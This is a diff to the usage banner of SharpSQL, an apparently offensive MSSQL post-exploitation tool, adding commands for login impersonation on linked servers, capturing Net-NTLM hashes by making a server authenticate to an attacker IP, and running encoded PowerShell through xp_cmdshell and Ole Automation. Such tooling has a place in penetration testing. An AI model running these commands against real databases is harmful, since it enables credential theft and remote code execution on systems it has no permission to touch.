@@ -14,7 +14,7 @@ namespace SharpSQL.Helpers
             Console.WriteLine("     ██ ██   ██ ██   ██ ██   ██ ██           ██ ██ ▄▄ ██ ██      ");
             Console.WriteLine("███████ ██   ██ ██   ██ ██   ██ ██      ███████  ██████  ███████ ");
             Console.WriteLine("                                                    ▀▀           ");
-            Console.WriteLine("Written By: Jb05s | Version: 1.1.0 \r\n");
+            Console.WriteLine("Written By: Jb05s | Version: 1.2.0 \r\n");
 
 
 
@@ -35,20 +35,26 @@ MSSQL Authenticated Server Enumeration and Impersonation:
             SharpSQL.exe gethash /db:DATABASE /server:SERVER /ip:ATTACKERIP [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
 
 MSSQL Command Execution:
-
-    [1] Execute Encoded PowerShell Command via 'xp_cmdshell':
+    
+    [1] Base64 Encode String for the '/command' switch:
+            SharpSQL.exe encode /b64:STRING
+    [2] Execute Encoded PowerShell Command via 'xp_cmdshell':
             SharpSQL.exe xp /db:DATABASE /server:SERVER /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-    [2] Execute Encoded PowerShell Command via 'Ole Automation Procedures':
+    [3] Execute Encoded PowerShell Command via 'Ole Automation Procedures':
             SharpSQL.exe ole /db:DATABASE /server:SERVER /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
 
 MSSQL Linked Server Command Execution:
 
-    [1] Execute Encoded PowerShell Command on Linked SQL Server via 'xp_cmdshell' with 'OPENQUERY':
+    [1] Retrieve SQL Logins Available for Impersonation and Impersonate the Available Login on Linked SQL Server:
+        SharpSQL.exe linkedlogin /db:DATABASE /server:SERVER /target:TARGET [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+    [2] Retrieve the Net-NTLM Hash for the Service Account of the Linked SQL Server:
+        SharpSQL.exe linkedhash /db:DATABASE /server:SERVER /target:TARGET /ip:ATTACKERIP [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+    [3] Execute Encoded PowerShell Command on Linked SQL Server via 'xp_cmdshell' with 'OPENQUERY':
             SharpSQL.exe linkedquery /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-    [2] Execute Encoded PowerShell Command on Linked SQL Server via 'xp_cmdshell':
+    [4] Execute Encoded PowerShell Command on Linked SQL Server via 'xp_cmdshell':
             SharpSQL.exe linkedxp /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
-    [3] Configure Linked SQL Server to Allow RPC connections:
-            SharpSQL.exe rpc /db:DATABASE /server:SERVER /target:TARGET [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
+    [5] Configure Linked SQL Server to Allow RPC connections:
+            SharpSQL.exe linkedrpc /db:DATABASE /server:SERVER /target:TARGET [/sqlauth /user:SQLUSER /password:SQLPASSWORD]
 
 MSSQL Double Linked Server Command Execution:
 
